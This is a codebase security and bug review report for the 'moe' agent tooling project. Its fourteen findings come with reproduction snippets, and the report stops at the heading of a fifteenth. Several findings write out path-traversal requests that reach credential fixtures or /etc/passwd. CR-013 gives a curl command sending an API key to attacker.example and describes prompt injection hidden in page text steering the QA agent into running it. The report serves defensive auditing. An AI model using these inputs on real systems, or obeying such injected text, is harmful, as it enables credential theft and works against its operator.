---
report: codebase-review
generated: 2026-09-03
base_sha: 42282fd609f72b94c6e4a0a80df9c643a4a0d577
depth: medium
denominator: 1003
denominator_rule: "tracked files with extension .ts, .tsx, .js, .mjs, .cjs, .py, .rs, .go, .rb, .java, .cs plus every credential-bearing path (.env, keys, .npmrc and similar) at any extension, excluding generated output, vendored trees and lockfiles"
files_opened: 1003
findings:
  critical: 1
  high: 22
  medium: 46
  low: 38
  total: 107
verified: false
status: issues_found
dispositions:
  fixed: 4
  stale: 1
  skipped: 0
  deferred: 0
  open: 102
---

# Codebase Review — moe

## Coverage

**Denominator:** 1003 tracked files with extension .ts, .tsx, .js, .mjs, .cjs, .py, .rs, .go, .rb, .java, .cs plus every credential-bearing path (.env, keys, .npmrc and similar) at any extension, excluding generated output, vendored trees and lockfiles.
**Opened:** 1003 of 1003 counted files.
**Tracked but outside the denominator:** 3064 (under `"packages`, `.claude-plugin`, `.github`, `.planning`, `assets`, `bin`, `docs`, `infra`, `packages`, `plugins`, `py`, `root`, `scripts`). These were not counted; say whether you read them.
**Base:** `42282fd609f72b94c6e4a0a80df9c643a4a0d577`, depth `medium`.

Absence of findings in an unopened area is evidence nobody looked, not
evidence it is clean.

## Critical

### CR-001: Live-run file route lets `../` in an allow-listed prefix reach the credential-fixture directory

**File:** `packages/flight/src/qa/api/routes/results.ts`
**Anchor:** `isLiveAllowedPath`
**Severity:** critical

`GET /api/results/:runId/file/:path{.+}` has two gating modes. For a completed
run the file must be a literal entry in `result.json` (`collectManifestPaths`).
For a **live** run (the manifest doesn't exist yet) the code instead checks
`isLiveAllowedPath(relPath)`, which is a raw-string prefix test against
`LIVE_ALLOWED_PREFIXES = ["screenshots/", "frames/", "captures/", "artifacts/"]`.
The route's own comment states the intent precisely: "Everything else under
the run dir — including `inputs/context/`, which `snapshotRunInputs`
populates with the project's credential fixtures before the run starts —
stays hidden for the run's whole live window."

The bug: `isLiveAllowedPath` is checked against the *raw, un-normalized*
`relPath` string, while the file that actually gets read is
`join(runDir, relPath)`, which Node's `path.join` normalizes (collapsing
`..` segments) before the read. A request for

```
GET /api/results/<runId>/file/screenshots/../inputs/context/<filename>
```

has `relPath = "screenshots/../inputs/context/<filename>"`, which
`relPath.startsWith("screenshots/")` reports as `true` — so
`isLiveAllowedPath` passes it — while `join(runDir, relPath)` resolves to
`runDir/inputs/context/<filename>`, i.e. exactly the credential-fixture
directory the comment says must stay hidden for the run's whole live window.
`isSafePath(runDir, filePath)` does not catch this either, because the
resolved path is still contained within `runDir` (just not within
`screenshots/`), which is all `isSafePath` checks.

Verified the path arithmetic directly:
```
node -e '
const { join } = require("node:path");
const runDir = "/tmp/proj/.moe-flight/results/run123";
const relPath = "screenshots/../inputs/context/secret.txt";
console.log(join(runDir, relPath));                       // .../run123/inputs/context/secret.txt
console.log(relPath.startsWith("screenshots/"));            // true
'
```
Both lines confirm the mismatch: the allow-list check and the actual disk
target disagree.

Because the Flight daemon has no authentication by design (see
`serve`'s own `--host` help text: "the server has no authentication, so
binding wider is an explicit opt-in") and WS/HTTP `Origin` checking is
opt-in and off by default (`decideUpgrade`'s `originAllowlist`), any client
that can reach the daemon during the live window of a run — which exists
for every run, by construction — can read the target application's
credential fixtures (passkeys, cookies, etc.) that `snapshotRunInputs`
staged under `inputs/context/` before the agent loop even starts.

Fix: normalize `relPath` (or the joined `filePath` relative to `runDir`)
before testing prefixes, e.g. compare against `path.relative(runDir,
filePath).split(sep)` rather than the raw route param, or simply re-derive
the check from the resolved path the same way `isSafePath` does for
containment.

## High

### CR-002: probeChrome never detects an installed browser on Linux because `command -v` has no standalone executable there

**File:** `bin/lib/probes.mjs`
**Anchor:** `probeChrome`, `tryExec(WIN32 ? "where" : "command", WIN32 ? [bin] : ["-v", bin])`
**Severity:** high

`probeChrome`'s Linux branch shells out to a program literally named `command`
to emulate `command -v <bin>`:

```js
const found = tryExec(WIN32 ? "where" : "command", WIN32 ? [bin] : ["-v", bin]);
```

`tryExec` uses `execFileSync`, which never goes through a shell, so this only
works if `/usr/bin/command` (or another `command` on `PATH`) exists as a real,
directly-executable file. `command -v` is a POSIX *shell builtin* — on Debian,
Ubuntu, and Alpine there is no standalone `command` binary at all, so
`execFileSync("command", …)` throws `ENOENT` every time, `tryExec` catches it
and returns `undefined`, and the loop over `linuxNames` never finds anything —
even when Chrome/Chromium is installed and on `PATH`.

I verified this against the exact image the project's own CI uses
(`node:24`, per `AGENTS.md`'s "What CI runs" section), plus Ubuntu 24.04 and
Alpine 3.20 for breadth. `/usr/bin/command` does not exist as a file on any of
them (only Fedora, not used anywhere in this repo's CI, happens to ship one):

```
$ docker run --rm node:24 sh -c 'ls -la /usr/bin/command'
ls: cannot access '/usr/bin/command': No such file or directory
```

Then with Chromium actually installed and on `PATH` in that same image:

```
$ docker run --rm -v $PWD:/repo -w /repo node:24 sh -c '
  apt-get update -qq && apt-get install -y -qq chromium
  which chromium                      # -> /usr/bin/chromium
  node -e "import(\"./bin/lib/probes.mjs\").then(m => console.log(m.probeChrome()))"
'
```
prints
```
{ name: 'chrome', tier: 'soft', ok: false, fixHint: 'Install Google Chrome or Chromium...', capability: '@bubstack/moe-glass (CDP browser access)' }
```
even though `chromium` is on `PATH` at `/usr/bin/chromium`. `moe-doctor` on a
completely ordinary Debian/Ubuntu/Alpine box with Chrome or Chromium installed
will always warn that the `@bubstack/moe-glass (CDP browser access)`
capability is unavailable and print "Install Google Chrome or Chromium" —
wrong, and directly contradicting the module's own doc comment that this
function is meant to "Match `packages/glass/skills/browsing/lib/chrome-process.js`'s
discovery behaviour rather than re-inventing it" (that file in fact checks
fixed absolute paths, not a `PATH` search at all, so the two have already
drifted independently of this bug).

Because `probeChrome` is a soft/warn probe, this never fails an exit code, but
it does make the doctor's Linux report actively misleading for the platform
most Moe contributors and CI containers run on. No test in
`bin/test/doctor.test.mjs` exercises `probeChrome` directly (nor via a PATH
that contains a real browser), which is why this shipped undetected.

Fix: drop the shell-out entirely and reuse the module's own
`executableOnPath()` helper (already defined in this file) for the Linux
name list, or shell out to `which` instead of `command` — `which` ships as a
real binary on all of node:24 / Ubuntu / Alpine / Debian by default, unlike
`command`.

### CR-003: aggregate_scenarios.py silently merges distinct untitled scenarios, discarding one's content

**File:** `packages/core/skills/extracting-requirements/scripts/aggregate_scenarios.py`
**Anchor:** `def dedup_scenarios(scenarios: list[dict]) -> list[dict]:`
**Severity:** high

`dedup_scenarios` keys on `scenario.get("title", "").strip()` alone. Two
scenarios that both come back from extraction with a missing or empty title
(plausible whenever an extraction subagent fails to produce that field) hash
to the same key `""` and get merged: the second scenario's
`owning_story_titles` and `sources` are folded into the first, but its
`kind`, `preconditions`, `steps`, `proof_seam`, and `final_observables` are
silently dropped — the surviving record is entirely the first scenario's,
now mislabeled with the second scenario's story/source references attached.

This is exactly the failure mode the sibling function in
`aggregate_stories.py` (`dedup_stories`) explicitly documents and guards
against: "An empty title is never treated as a match, even against another
empty title... merging them would silently drop one epic's requirement and
misattribute its citations to the survivor." That fix — giving every
empty-titled record its own unique dedup key — was never applied to
`dedup_scenarios`, even though it aggregates the same kind of
extraction-subagent output and is vulnerable to the identical bug.

Fix: mirror `aggregate_stories.py`'s empty-title handling — assign each
empty-titled scenario a unique key so it is never merged with another
empty-titled scenario.

### CR-004: compact-resolved.mjs re-compacts already-resolved findings and duplicates the "Resolved findings" heading on a second run

**File:** `packages/core/skills/fixing-a-code-review/scripts/compact-resolved.mjs`
**Anchor:** `const findingRe = /^###\s+(CR-\d{3}):\s+(.*)$/gm;`
**Severity:** high

`findingRe` scans the *entire* document body for `### CR-###:` headings with a
`fixed`/`stale` disposition, with no exclusion for headings that already live
inside a previously-written `## Resolved findings` section. The tool is meant
to be run repeatedly over a review's lifetime (findings get stamped as fixes
land, then compacted), and on a second run it re-finds every finding it
already moved into `## Resolved findings` on the first run and "compacts"
them again.

Reproduced directly: with a report containing `CR-001` (disposition `fixed`)
and `CR-002` (initially open), running the script once correctly moves
`CR-001`'s full block into a new `## Resolved findings` section and leaves an
inline one-line summary in its place. Stamping `CR-002` as `stale` and
running the script again produces:

```
## Checked and found sound
...
## Resolved findings
  ### CR-002: Second bug
...
  ### CR-001: First bug
...
## Resolved findings
- **CR-001:** First bug — fixed (`abc123`)
```

Two defects fall out of this in one run: (1) a second `## Resolved findings`
heading is created rather than appending to the existing one, and (2) `CR-001`'s
full finding body — File/Anchor/Severity/description, the exact content the
first compaction was written to preserve — is deleted and replaced with a bare
one-line summary, because the script found the old `### CR-001` heading inside
the *existing* Resolved section and collapsed it exactly like a fresh finding.
Every additional compaction pass on an already-compacted report destroys more
of the previously-preserved record.

Fix: skip (or stop scanning at) content already under a `## Resolved findings`
heading, e.g. by only scanning the body up to the first `## Resolved findings`
match, or by checking that a candidate heading isn't nested under one before
compacting it.

### CR-005: review-merge.mjs's finding validation does not enforce the "no line-number citation" rule it exists to guarantee

**File:** `packages/core/skills/reviewing-a-codebase/scripts/review-report.mjs`
**Anchor:** `export function findingProblems(block, repo) {`
**Severity:** high

`findingProblems` is the function `review-merge.mjs` calls to decide whether
a shard's finding is malformed and must be refused. It checks for a `**File:**`
field, path safety, file existence, a non-empty `**Anchor:**`, and a valid
`**Severity:**` — but never checks the *content* of the anchor or block body
for a line-number citation. Confirmed directly:

```
node -e '
import("./packages/core/skills/reviewing-a-codebase/scripts/review-report.mjs").then(({ findingProblems }) => {
  const block = "### CR-001: Some bug\n**File:** `packages/core/README.md`\n**Anchor:** `packages/core/README.md:42`\n**Severity:** high\n\nDescription.";
  console.log(findingProblems(block, process.cwd()));
});'
# => []
```

A finding whose `**Anchor:**` is a bare line-number citation passes cleanly
and `review-merge.mjs` will merge it into `CODEBASE-REVIEW.md` unchanged. The
only place this pattern is actually rejected is `review-check.mjs`'s own
inline regex (`` /`[^`\n]*\.[A-Za-z0-9]+:\d+(?:-\d+)?`/ ``), which is a
separate, optional pre-merge lint — not something `review-merge.mjs` runs
itself. This directly contradicts the reviewing-a-codebase contract's core
invariant ("Never cite a line number... line offsets survive neither merge
nor repair"): the one authoritative step that actually produces the durable,
disposition-tracked report has no enforcement of the rule the whole
downstream workflow (`fixing-a-code-review`'s stable anchors) depends on. A
shard report that skips `review-check.mjs` — or one that passed it before a
later hand-edit reintroduced a line number — will merge cleanly.

Fix: move the citation-pattern check (and the fenced-`###` and numbered-heading
checks currently unique to `review-check.mjs`) into `findingProblems` itself,
so `review-merge.mjs` refuses them unconditionally rather than relying on a
separately-invoked lint.

### CR-006: A bad `wait-for-turn` timeout argument produces NaN and either hangs forever or fails instantly instead of erroring

**File:** `packages/crew/src/cli.ts`
**Anchor:** `parseWaitForTurnArgs`
**Severity:** high

`parseWaitForTurnArgs`'s positional-timeout branch only checks that the argument *starts* with a digit (`/^[0-9]/.test(a)`) before calling `Number(a)` — unlike the sibling `--after-line` branch a few lines above, which validates with `Number.isFinite(n)`. A value like `60x` (or any digit-led non-numeric string, e.g. a stray unit suffix from a scripted caller) passes the regex, so `timeout` becomes `NaN`, and no error is returned.

Extracting the exact parsing logic confirmed the effect:

```
parsed opts: { timeout: NaN, afterLine: undefined }
effective timeout: NaN
deadline: NaN now>=deadline? false now<deadline? false
```

Downstream, `cmdWaitForTurn` (`packages/crew/src/commands/wait-for-turn.ts`, read only to trace the consequence) computes `const timeout = opts.timeout ?? 60` — `??` does not replace `NaN`, so `timeout` stays `NaN`, and `deadline = Date.now() + NaN*1000` is `NaN`. Both `Date.now() >= deadline` (the file-wait loop's timeout check) and `Date.now() < deadline` (the turn-wait loop's condition) evaluate to `false` for a `NaN` deadline. The practical effect is two different silent failures depending on timing:
- If the events file does not exist yet, the first loop's timeout check never fires, so the command polls forever with no way to time out.
- If the events file already exists, the second loop's condition is false on the very first check, so the command returns `Timeout waiting for turn (stop or session_end) after NaNs` immediately, misreporting a real command as a bogus instant timeout.

Either way the command silently breaks instead of the "Error: --after-line expects a number" style rejection the sibling flag gets. `cli.test.ts` has a covering test for converse's analogous numeric-timeout validation (`"rejects converse with a non-numeric timeout positional"`) but no equivalent test exists for `wait-for-turn`'s positional timeout, which is how this gap survived. Fix: validate with `Number.isFinite` in the digit-leading branch the same way `--after-line` does, and reject non-numeric input with a clear code-2 error.

### CR-007: Pack-file inline scalar parser silently truncates values containing `" #"`, even inside quotes

**File:** `packages/crew/src/core/packs.ts`
**Anchor:** `parseScalar`
**Severity:** high

`parseScalar`'s comment-stripping step is `raw.replace(/\s+#.*$/, "").trim()`, applied unconditionally before the quoted-string check. It does not know about quoting, so any inline scalar (a top-level key, or a worker's `namePrefix`/`harness`/`description`/`rolePrompt` when written on one line rather than as a `|` block) that contains a space followed by `#` is truncated at that point, and the truncation runs even when the value is quoted, corrupting the quoting itself.

Verified directly by extracting the exact regex/logic from the file and running it in `node`:

```
parseScalar('"Test # hashtag pack"')     -> '"Test'         // stray leading quote, rest lost
parseScalar('Fix issue #20 in review')   -> 'Fix issue'      // "#20 in review" silently dropped
```

This is not a contrived input for this project: the codebase's own review/issue conventions constantly use `#N` (`issue #18`, `issue #20`, `CR-021`, etc.), so a pack author writing something as ordinary as `description: "Fix issue #20 regression"` in `packs/*.yaml` gets silently truncated to `Fix issue` with no error — `validatePack` only checks that `description`/`rolePrompt`/`namePrefix` are non-empty strings, so a truncated-but-still-non-empty result passes validation and the corruption ships straight into the launched worker's role prompt. `readSequence`'s continuation-key path uses the same `parseScalar`, so this affects every inline field of every worker entry, not just top-level keys. None of the existing cases in `test/packs.test.ts` cover a value containing `#`, so this shipped unnoticed.

Fix: only strip an inline comment when not inside a quoted value (e.g. only apply the regex when `raw.trim()` doesn't already start with a quote character, or do a proper quote-aware scan), and preserve `#` characters that are already inside a matched quote pair.

### CR-008: Unsanitized `session_id` from hook stdin lets a crafted payload escape the worker dir and can defeat the hook's own "always exit 0" guarantee

**File:** `packages/crew/src/hooks/emit-event.ts`
**Anchor:** `runHook`, `"the entry point must always exit 0"`
**Severity:** high

`runHook` reads `session_id` straight off the untrusted JSON payload piped to
the hook on stdin (`const sessionId = payload.session_id;`) and only checks
`typeof sessionId !== "string" || sessionId.length === 0`. That string is then
passed unvalidated into `metaPath(opts.workerDir, sessionId)` and
`eventsPath(opts.workerDir, sessionId)` (`packages/crew/src/core/paths.ts`),
which build the on-disk path by plain string interpolation:
`` `${dir}/${sid}.meta` `` / `` `${dir}/${sid}.events.jsonl` ``. I confirmed
this with a standalone repro:

```
$ node -e '
function metaPath(dir, sid) { return `${dir}/${sid}.meta`; }
console.log(metaPath("/home/op/.local/state/moe-crew/workers", "../../../../tmp/pwned"));
'
/home/op/.local/state/moe-crew/workers/../../../../tmp/pwned.meta
```

A `session_id` containing `../` therefore lets `writeMeta`
(`packages/crew/src/core/worker-store.ts`) and `appendEvent`
(`packages/crew/src/core/event-log.ts`) write a `.meta`/`.events.jsonl` file
outside the worker dir, at any path whose parent directory exists.

This is inconsistent with the rest of the same module family: `shimPath`,
`workerHomePath`, `harnessMarkerPath`, and `worktreeMarkerPath` in
`paths.ts` all call `assertSafeSegment(name)` on the tmux name before using it
in a path, specifically because (per that file's own comment) "a co-resident
local user could... pre-plant a directory (or a symlink) at a predictable
path." `adopt.ts` similarly validates a human-supplied session id against
`CLAUDE_SESSION_ID` (`/^[0-9a-fA-F][0-9a-fA-F-]{7,}$/`) before using it. The
hook path is the one place a session id reaches `metaPath`/`eventsPath`
without any such check — and it is also the path where the id is least
trusted: for codex/pi (`idStrategy: "derive"`) the id is minted by the
external harness process and handed back to moe-crew via this same JSON
payload, not generated by moe-crew itself.

Separately from the traversal, this call is **not** wrapped in a try/catch in
`runHook` (only `JSON.parse` is). The file's own header comment states the
entire point of this rewrite is "Stop hook can break session shutdown (issue
#15), so the entry point must always exit 0," and the function doc repeats
"Never throws on malformed or unexpected input." But a `session_id` whose
traversal target's parent directory does not exist (e.g. `foo/bar` where
`foo` is not a real directory under the worker dir) makes `writeFileSync`
throw `ENOENT` synchronously out of `writeMeta`/`appendEvent`, out of
`runHook`, and out of `main()`'s `await readStdin()` continuation — an
unhandled promise rejection that, under Node's default
`--unhandled-rejections=throw`, exits the process non-zero. That is exactly
the "non-zero exit breaks session shutdown" failure mode issue #15 was fixed
to avoid, now reachable again via a field the fix never validated. The
existing carve-out in the doc comment ("I/O errors such as disk-full... are
not suppressed") is written for operational failures, not for a
deterministic consequence of skipping input validation on an
externally-supplied field.

Fix: validate `session_id` against a safe-segment pattern (reusing or
mirroring `assertSafeSegment`/`CLAUDE_SESSION_ID`) before using it to build
any path, and treat a failing validation as a no-op (return `empty`) the same
way a missing/empty `session_id` already is.

### CR-009: `cellId()` uses an unsafe separator, letting two distinct cells collide on the same DOM id and SSE event name

**File:** `packages/flight/dashboard/src/contracts.ts`
**Anchor:** `cellId`
**Severity:** high

`cellId` builds the identifier by joining the four identity fields with a bare
hyphen:

```ts
export function cellId(scenario: string, agent: string, credential: string, os: string): string {
  return `cell-${scenario}-${agent}-${credential}-${os}`;
}
```

Unlike `cellKey`, whose own comment explains it deliberately uses `\t` as the
separator because "tab is absent from every identity segment," `cellId` gives
no such guarantee for `-`, and scenario/agent names routinely contain
hyphens (`claude-code`, `web-search`, `multi-step-task`, etc.). Two distinct
`(scenario, agent, credential, os)` tuples can therefore produce the identical
string. Verified:

```js
cellId("foo", "bar-baz", "", "linux")   // "cell-foo-bar-baz--linux"
cellId("foo-bar", "baz", "", "linux")   // "cell-foo-bar-baz--linux"  <- same
```

This id is not cosmetic: `templates.ts` emits it as both the `<td>`'s DOM
`id` and its htmx `sse-swap` attribute (`id="${id}" sse-swap="${id}"
hx-swap="outerHTML"`), and `server.ts`'s `publishCell` uses the same string as
the literal SSE `event:` name (`event: oneLine(cellId(...))`). When two grid
cells collide on this string, an update meant for one cell's `<td>` is
delivered to the same `sse-swap` target as the other cell, so a run finishing
in cell A can overwrite cell B's rendered `<td>` with A's HTML on the very
next SSE frame — silent data corruption in the live view, not just a
duplicate-id lint warning. The existing unit test
(`packages/flight/dashboard/test/dashboard-contracts.test.ts`, `cellKey +
cellId form the composite key and DOM id`) only checks a single non-colliding
tuple and would not catch this.

Fix: give `cellId` the same tab-join-then-encode treatment as `cellKey` (or at
minimum percent-encode/hash each segment before joining) so two different
4-tuples can never produce the same id.

**Disposition:** fixed
**Commit:** `22642b56d7dd202257719718409fa00cd28b8e0a`
**Resolved:** 2026-09-04
**Note:** —
### CR-010: Hyphen-joined `cellId` can collide across distinct (scenario, agent, credential, os) identities, misrouting SSE cell updates

**File:** `packages/flight/dashboard/src/templates.ts`
**Anchor:** `cellHtml` — `` const open = `<td class="c" id="${id}" sse-swap="${id}" hx-swap="outerHTML" ${col}>` ``
**Severity:** high

`cellHtml` uses `view.cell_id` verbatim as both the `<td>`'s `id` and its
`sse-swap` attribute — the value htmx uses to route incoming SSE frames to
this exact cell. `cell_id` is produced by `cellId()` in
`packages/flight/dashboard/src/contracts.ts`:

```ts
export function cellId(scenario: string, agent: string, credential: string, os: string): string {
  return `cell-${scenario}-${agent}-${credential}-${os}`;
}
```

This is a plain hyphen-join of four free-text segments with no escaping or
length-prefixing, so two different identity tuples can produce the exact same
string whenever a segment boundary is ambiguous. Reproduced directly against
the function body:

```
$ node -e "
function cellId(scenario, agent, credential, os) { return \`cell-\${scenario}-\${agent}-\${credential}-\${os}\`; }
console.log(cellId('signup', 'claude-opus-4', 'default', 'linux'));
console.log(cellId('signup-claude', 'opus-4', 'default', 'linux'));
"
cell-signup-claude-opus-4-default-linux
cell-signup-claude-opus-4-default-linux
```

Hyphenated agent/model names are the norm, not an edge case, in this
ecosystem (`claude-opus-4`, `gpt-4o-mini`, `gemini-2.5-pro`, etc.), so this is
not a contrived input. Contrast with `cellKey()` in the same file, which
deliberately tab-separates the same four segments specifically "so it is a
safe composite separator" — the map lookup key is collision-safe, but the
DOM id / SSE address derived from the same four segments is not.

The collision is not cosmetic: `packages/flight/dashboard/src/server.ts`
uses `cellId(...)` as the literal SSE `event:` name when publishing a
changed cell (`event: oneLine(cellId(cell.scenario, cell.agent, ...))`), and
resolves an incoming `cell_id` back to a cell via `cellForId`, which does a
linear scan returning the *first* cell in the grid whose own `cellId(...)`
equals the target — i.e. first-match-wins on collision. Two colliding cells
therefore (a) render with duplicate `id`/`sse-swap` attributes in the page
(both `<td>`s listen for the same event under `htmx-ext-sse.js`'s
`registerSSE`), and (b) whichever cell's dir the scanner diffs first gets its
freshly rendered HTML broadcast under the shared event name, which htmx then
swaps into *both* `<td>` elements — silently overwriting one scenario/agent's
displayed pass/fail/cost data with an unrelated cell's data. For a dashboard
whose entire purpose is trustworthy pass/fail reporting, this is a
correctness failure a viewer has no way to detect from the page.

Fix: derive `cellId` from the same tab-joined (or otherwise delimiter-safe)
key `cellKey` already uses, e.g. hash it or percent/URL-encode each segment
before joining, so no two distinct identity tuples can ever produce the same
id.

**Disposition:** stale
**Commit:** —
**Resolved:** 2026-09-04
**Note:** Same root defect as CR-009 (both point at cellId()'s bare hyphen-join in contracts.ts, only the call site/impact framing differs). Already resolved by 22642b56 (CR-009), which percent-encodes each segment before joining. Verified: checked out contracts.ts as of the pre-fix commit (92c44271) and manually re-ran the templates.ts-level repro from this finding (gridHtml -> fallbackCell -> cellId with scenario/agent tuples signup/claude-opus-4 vs signup-claude/opus-4) -- it collided as described; re-running the same repro against the fixed contracts.ts (22642b56) produces four distinct ids. No separate fix needed in templates.ts itself.
### CR-011: `trySpawnOn` leaves the spawned Chrome `ChildProcess` with no `'error'` listener, crashing the host process on spawn failure

**File:** `packages/flight/src/qa/adapters/web/lib/chrome-process.js`
**Anchor:** `const proc = spawn(chromePath, args, {`
**Severity:** high

`trySpawnOn()` calls `spawn(chromePath, args, { detached: true, stdio: 'ignore' })` and immediately calls `proc.unref()`, then only polls `isPortAlive()` — it never attaches `proc.on('error', ...)`. Per Node's `child_process` docs, `spawn()` can emit an asynchronous `'error'` event for failures that only manifest after the call returns (e.g. `EACCES` on a file that exists but isn't executable, the binary being removed between the `existsSync()` check in `startChrome()` and the actual `spawn()`, or resource-exhaustion errors like `EMFILE`/`EAGAIN`). An `EventEmitter` with no listener for an emitted `'error'` event throws, and an uncaught throw from a process-internal event tick crashes the whole runtime.

I reproduced the exact failure shape with a minimal repro that mirrors this code's `spawn(...).unref()` pattern:

```
$ node -e '
const { spawn } = require("child_process");
const proc = spawn("/nonexistent/path/to/binary-xyz", ["--foo"], { detached: true, stdio: "ignore" });
proc.unref();
console.log("spawn() call returned, script continues...");
'
spawn() call returned, script continues...
node:events:487
      throw er; // Unhandled 'error' event
      ^
Error: spawn /nonexistent/path/to/binary-xyz ENOENT
...
```

The process exits with code 1 immediately after the synchronous call returns — i.e. the crash is not confined to the promise chain `trySpawnOn`/`startChrome` return; it takes down the entire `moe-flight` process (whatever server or batch run is in progress), not just the current QA run. The existing `chrome-process.test.ts` never mocks `spawn` and only exercises `killChrome()`, so this path is untested.

Fix: attach `proc.on('error', (err) => { ... })` before returning/polling in `trySpawnOn`, converting the async spawn failure into a rejected promise (or at minimum a swallowed/logged error) instead of an unhandled `EventEmitter` throw.

### CR-012: `navigate()` never checks `Page.navigate`'s `errorText`, so failed navigations are reported as success

**File:** `packages/flight/src/qa/adapters/web/lib/navigation.js`
**Anchor:** `navigateResult = await ps.send('Page.navigate', { url });`
**Severity:** high

Chrome's CDP `Page.navigate` resolves with `{frameId, loaderId, errorText?}`, where `errorText` is set "if and only if navigation has failed" (DNS failure, connection refused, cert error, blocked resource, etc. — e.g. `net::ERR_NAME_NOT_RESOLVED`). Chrome still renders an error page for these cases and that error page still fires `Page.loadEventFired`, so `navigate()`'s `await loadP` resolves normally. Because the function never inspects `navigateResult.errorText`, a failed navigation returns exactly like a successful one.

I confirmed this is not handled anywhere downstream either: `grep -rn "errorText" packages/flight/src/` returns zero hits in the whole package, and `executeNavigate` in `packages/flight/src/qa/adapters/web/tools/page-actions.ts` unconditionally does:

```ts
await ctx.chrome.navigate(ctx.tab, args.url as string);
return composeResult("navigated", await ctx.takeReturnScreenshot());
```

So the `navigate` tool always reports `"navigated"` to the agent, even when the target host is unreachable, TLS fails, or the URL is mistyped. The existing test file (`test/qa/adapters/web/lib/navigation.test.ts`) only covers the case where `Page.navigate` itself throws synchronously (PRI-1690's unhandled-rejection fix) — it does not cover the resolved-with-`errorText` case, so this gap is untested.

Fix: after `navigateResult = await ps.send('Page.navigate', { url })`, check `navigateResult?.errorText` and throw (or otherwise surface) a navigation-failed error instead of falling through to `await loadP`.

### CR-013: Bash tool forwards live LLM provider credentials into a shell the agent controls while reading untrusted page content

**File:** `packages/flight/src/qa/agent/bash-tool.ts`
**Anchor:** `SDK_PASSTHROUGH_KEYS`, `buildScrubbedEnv`, `redactSecrets`
**Severity:** high

`buildScrubbedEnv` deliberately copies `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `ANTHROPIC_BASE_URL`, `OPENAI_ORG_ID`, etc. into the environment of every `bash -c <command>` child process the QA agent spawns. The tool's own docstring calls out that this is "the child process the LLM controls." `redactSecrets` then scrubs these values out of `transcriptText` (the copy written to `run.jsonl`/evidence), but explicitly leaves `text` — the value fed back into the model's own context on the next turn — untouched, and does nothing to constrain what the child process can do with the values before they ever reach `text` (e.g. `curl -d "$ANTHROPIC_API_KEY" https://attacker.example/x`, which never prints the key to stdout at all).

This is a real exfiltration path for the QA agent specifically, because the whole point of this codebase is an LLM that ingests content from the *target under test* — `extract` returns page DOM text and `screenshot`/`return_screenshot` return page pixels straight into the model's context every turn (see `tools/visual.ts`, `tools/return-screenshot.ts`). A target page (or a side-trip tab opened via `new_tab`, which the model is explicitly encouraged to visit for "another site") that contains an indirect prompt-injection payload — hidden text instructing the agent to run a specific `bash` command — can induce the agent to exfiltrate the operator's live Anthropic/OpenAI credential (and any base-URL/proxy credentials embedded in `ANTHROPIC_BASE_URL`/`HTTPS_PROXY`, which the neighboring `config-effective.ts` route treats as credential-capable) to an attacker-controlled endpoint. Nothing in `bash-tool.ts` restricts outbound network access from the spawned shell.

The CR-038 redaction (`redactSecrets`) only protects the audit trail from *accidental* leakage (e.g. a stray `env` dump landing in `run.jsonl`); it does not address deliberate misuse by an agent that has been steered via injected page content, and the file's own comments frame the credential forwarding as something "the agent still needs" — a functionality tradeoff, not a security boundary. Fix: either stop forwarding live SDK credentials into the LLM-controlled shell by default (require an explicit opt-in per run, or forward only a scoped/short-lived credential), or add egress restriction to the spawned process so it cannot reach the network directly with these values.

### CR-014: `findCard` bypasses the codebase's own "one and only path-safety guard", enabling a file-existence oracle for arbitrary paths

**File:** `packages/flight/src/qa/cards/store.ts`
**Anchor:** `findCard`
**Severity:** high

`packages/flight/src/qa/paths.ts` states in its header comment: "The one and
only path-safety guard for Flight. All containment checks go through this
[`isSafePath`]." `findCard` is a disk-touching function that takes an
untrusted `id` (a raw route param from `GET/DELETE/PUT /api/scenarios/:id`,
`POST /api/scenarios/:id/approve`, `POST /api/run/:id`, and `POST
/api/fanout/:id`) and does:

```
const directPath = join(storiesDir, `${id}.md`);
if (existsSync(directPath)) {
  const content = readFileSync(directPath, "utf-8");
  const card = parseStoryCard(content); // throws on parse failure
  ...
}
```

with no `isSafePath` call at all — unlike every other disk-touching route in
this same package (`results.ts`, the `/:id/:mode` route in `fanout.ts`,
`ws-handlers.ts`), which all explicitly guard the same class of input.

Confirmed Hono decodes a percent-encoded slash inside a single `:id`
segment into a literal `/` before the handler sees it, so `c.req.param("id")`
can carry `../` sequences even though the router only matches one raw path
segment:
```
node (hono 4.13.5): GET /api/scenarios/..%2f..%2f..%2fetc%2fpasswd
  => c.req.param("id") === "../../../etc/passwd"
```
`join(storiesDir, "${id}.md")` therefore resolves outside `storiesDir` for a
crafted `id`.

Concretely reachable today, no extra precondition: `parseStoryCard` throws
`"Story card missing required field: id"` whenever the target file doesn't
happen to have YAML-frontmatter-shaped content — true of almost any file
that isn't itself a story card. That exception is not caught by any of the
route handlers that call `findCard` (`scenarios.ts` GET/DELETE/PUT,
`run.ts` POST `/:id`, `fanout.ts` POST `/:id`), so it propagates to Hono's
global `app.onError` and comes back as `500 {"error":"internal","message":
"Story card missing required field: id"}`. A genuinely missing file instead
returns `404 {"error":"not found"}`. The two status codes are
distinguishable, giving an unauthenticated caller a working **existence
oracle** for any absolute or relative path (ending in `.md`, since that
suffix is always appended) reachable from `storiesDir` via `..` — e.g.
`GET /api/scenarios/..%2f..%2f..%2fREADME.md` vs
`GET /api/scenarios/..%2f..%2f..%2fdoes-not-exist.md`.

If a target `.md` file both exists and happens to already carry a
frontmatter `id:` field equal to the full traversal string used to reach it,
`findCard` returns that card as a live hit, at which point:
- `GET`/`fanout`'s `/:id` route leak that file's parsed content,
- `DELETE` calls `unlinkSync(join(storiesDir, entry.filename))` where
  `entry.filename` is the same traversal string re-joined with
  `storiesDir`, i.e. **arbitrary file delete**,
- `PUT` writes attacker-supplied merged content back to that same resolved
  path, i.e. **arbitrary file write**.

This id-match precondition is not enforced by any actual write-side guard
today (`POST /api/scenarios` confines new ids to `storiesDir` via
`isSafePath`, so an attacker can't presently plant such a file through this
API alone), which is why this is rated high rather than critical — but the
existence-oracle half requires no precondition and is exploitable right now,
and the write/delete half becomes live the moment any other code path
(future feature, shared filesystem, imported cards) ever writes a `.md`
file whose frontmatter `id` isn't charset-restricted.

Fix: route `findCard`'s `directPath` through `isSafePath(storiesDir,
directPath)` (or `resolveInside`) before `existsSync`/`readFileSync`, exactly
as `fanout.ts`'s `/:id/:mode` route already does for its own id via
`parseRunId`, and as the CR-040/041/042 comments already flag for the
sibling `writeCards` path.

### CR-015: `fetch_credential` failure path leaks resolver stderr into the persisted transcript, bypassing the redaction opt-out

**File:** `packages/flight/src/qa/context/credential-tool.ts`
